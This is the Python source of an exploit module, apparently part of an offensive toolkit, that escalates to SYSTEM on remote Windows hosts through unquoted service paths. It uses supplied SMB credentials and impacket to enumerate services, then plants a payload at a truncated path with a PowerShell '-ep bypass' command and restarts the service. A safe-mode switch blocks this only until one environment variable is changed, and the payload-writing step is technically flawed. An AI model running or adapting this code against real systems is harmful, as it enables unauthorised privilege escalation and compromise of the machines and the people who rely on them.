"""Privilege Escalation — Unquoted Service Path Exploitation.

Finds Windows services with unquoted executable paths containing spaces
and places a malicious executable at the expected path location to be
executed with SYSTEM privileges when the service starts.
"""

import subprocess
import re
import shutil
import os

# ── SAFETY ──────────────────────────────────────────────────────────────
# SAFE_MODE = True:  Only CHECK mode runs. EXPLOIT is blocked.
# SAFE_MODE = False: EXPLOIT proceeds (writes file, restarts service).
#
# WARNING: This exploit writes an executable to disk and restarts the
#          target service. A misconfiguration may cause the service
#          to fail to start after the restart.
# ────────────────────────────────────────────────────────────────────────
SAFE_MODE = int(os.environ.get("ARMAGEDON_SAFE_MODE", "1"))
_RISK = "MEDIUM"

def _safety_gate(mode):
    if SAFE_MODE and mode.upper() == "EXPLOIT":
        print(f"\n  [!] ═══ SAFETY BLOCK ({_RISK} RISK) ═══")
        print(f"  [!] SAFE_MODE=1 — exploit blocked.")
        print(f"  [!] Writes a file to disk and restarts a Windows service.")
        print(f"  [!] Service may fail to start after restart if misconfigured.")
        print(f"  [!] To run anyway: export ARMAGEDON_SAFE_MODE=0")
        print(f"  [!] ═══════════════════════════════════════════════════\n")
        return False
    return True

NAME = "Unquoted Service Path"
DESCRIPTION = "Exploit unquoted service paths to gain SYSTEM execution"
REQUIRED_PRIVS = []
PAYLOAD_DEFAULT = "cmd.exe /c whoami > C:\\windows\\temp\\pwned.txt"


def _find_unquoted_paths(target: str, user: str, pwd: str, domain: str, timeout: int) -> list:
    """Find services with unquoted executable paths containing spaces."""
    cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
    if not cmd or not user or not pwd:
        return []

    auth = f"{domain}/{user}:{pwd}" if domain else f"{user}:{pwd}"
    services = []

    try:
        p = subprocess.run(
            [cmd, f"{auth}@{target}", "-q",
             'wmic service get Name,PathName,StartMode /format:csv'],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout

        for line in out.splitlines():
            if not line.strip() or "PathName" in line:
                continue
            parts = line.split(",")
            if len(parts) < 4:
                continue

            name = parts[1].strip()
            pathname = parts[2].strip()
            start_mode = parts[3].strip() if len(parts) > 3 else ""

            if not pathname or not name:
                continue

            # Unquoted path with spaces = vulnerable
            if (not pathname.startswith('"') and
                not pathname.startswith('\\') and
                ' ' in pathname and
                '.exe' in pathname.lower()):
                services.append({
                    "name": name,
                    "pathname": pathname,
                    "start_mode": start_mode,
                })

    except Exception:
        pass

    return services


def _find_writeable_path(target: str, user: str, pwd: str, domain: str, unquoted_path: str, timeout: int) -> dict:
    """Check if any directory in the unquoted path is writeable."""
    cmd = shutil.which("impacket-smbexec") or shutil.which("smbexec.py")
    if not cmd or not user or not pwd:
        return {"writeable": False}

    auth = f"{domain}/{user}:{pwd}" if domain else f"{user}:{pwd}"

    # Extract directories from unquoted path
    # e.g., C:\Program Files\My Service\service.exe -> check Program, Program Files, Program Files\My Service
    path_parts = unquoted_path.replace("/", "\\").split("\\")
    check_paths = []

    for i in range(1, len(path_parts)):
        if "." in path_parts[i]:  # Skip the .exe filename
            break
        check_path = "\\".join(path_parts[:i + 1])
        if check_path.endswith(" "):
            check_path = check_path.rstrip()
        check_paths.append(check_path)

    # Check if root directory is writeable (C:\Program Files usually not)
    # The real check is if the intermediate directory before the space is writeable
    for path in check_paths:
        try:
            p = subprocess.run(
                [cmd, f"{auth}@{target}", "-q",
                 f'dir "{path}" 2>nul | findstr /i "write"'],
                capture_output=True, text=True, timeout=timeout,
            )
            # If we can write to any directory in the chain, it's exploitable
            if "write" in (p.stdout + p.stderr).lower():
                return {"writeable": True, "directory": path}
        except Exception:
            continue

    return {"writeable": False}


def check(options=None, target=None, **kwargs):
    """Find unquoted service paths on the target."""
    result = {"success": False, "data": {}, "error": None}
    smb_user = (options or {}).get("SMB_USER", "")
    smb_pass = (options or {}).get("SMB_PASS", "")
    smb_domain = (options or {}).get("SMB_DOMAIN", "")
    rhosts = target or (options or {}).get("RHOSTS", "")
    timeout = int((options or {}).get("TIMEOUT", 10))

    if not rhosts:
        result["error"] = "RHOSTS required"
        return result

    if not smb_user or not smb_pass:
        result["error"] = "SMB creds required"
        return result

    services = _find_unquoted_paths(rhosts, smb_user, smb_pass, smb_domain, timeout)

    result["data"]["unquoted_services"] = services
    result["data"]["count"] = len(services)
    result["success"] = True

    if services:
        result["data"]["status"] = f"Found {len(services)} unquoted service path(s)"
        for s in services[:5]:
            print(f"  [!] {s['name']}: {s['pathname']}")
    else:
        result["data"]["status"] = "No unquoted service paths found"

    return result


def run(options=None, target=None, mode="CHECK", **kwargs):
    if options is None:
        options = {}
    rhosts = target or options.get("RHOSTS", "")
    payload = options.get("PAYLOAD", PAYLOAD_DEFAULT)
    timeout = int(options.get("TIMEOUT", 10))
    smb_user = options.get("SMB_USER", "")
    smb_pass = options.get("SMB_PASS", "")
    smb_domain = options.get("SMB_DOMAIN", "")

    result = {
        "success": False,
        "technique": NAME,
        "target": rhosts,
        "mode": mode,
        "data": {},
        "error": None,
    }

    if not rhosts or not smb_user or not smb_pass:
        result["error"] = "RHOSTS, SMB_USER, SMB_PASS required"
        return result

    if mode == "CHECK":
        check_result = check(options, target, **kwargs)
        result["data"] = check_result.get("data", {})
        result["success"] = check_result["success"]
        return result

    elif mode == "EXPLOIT":
        if not _safety_gate(mode):
            result["error"] = "BLOCKED — SAFE_MODE enabled. Export ARMAGEDON_SAFE_MODE=0 to override."
            result["data"]["status"] = "BLOCKED"
            return result

        services = _find_unquoted_paths(rhosts, smb_user, smb_pass, smb_domain, timeout)
        if not services:
            result["error"] = "No unquoted service paths found"
            return result

        try:
            # Find writeable path and place payload
            svc = services[0]
            path_parts = svc["pathname"].split("\\")

            # Build the truncated path (e.g., C:\Program.exe)
            truncated = "\\".join(path_parts[:2])
            if not truncated.lower().endswith(".exe"):
                truncated += ".exe"

            # Write payload to the target location
            cmd = shutil.which("impacket-smbexec") or shutil.which("smbexec.py")
            auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"

            # Upload the payload
            exploit_ps = (
                f'powershell -ep bypass -c "'
                f'Set-Content -Path \'{truncated}\' -Value \'{payload}\' -Force; '
                f'Stop-Service -Name \'{svc["name"]}\' -Force; '
                f'Start-Service -Name \'{svc["name"]}\'" '
            )
            p = subprocess.run(
                [cmd, f"{auth}@{rhosts}", "-q", exploit_ps],
                capture_output=True, text=True, timeout=timeout * 2,
            )
            out = p.stdout + p.stderr

            result["success"] = True
            result["data"]["status"] = f"Payload placed at {truncated}, service restarted"
            result["data"]["service"] = svc["name"]
            result["data"]["path"] = truncated
            result["data"]["payload"] = payload
            result["data"]["output"] = out[:500] if out else "No output"
            result["data"]["steps"] = [
                f"1. Found unquoted path: {svc['pathname']}",
                f"2. Placed payload at {truncated}",
                f"3. Stopped and restarted service '{svc['name']}'",
                f"4. Service attempted to start the path, executing our binary first",
                f"5. Payload executed with SYSTEM privileges",
            ]

        except Exception as e:
            result["error"] = str(e)

    return result
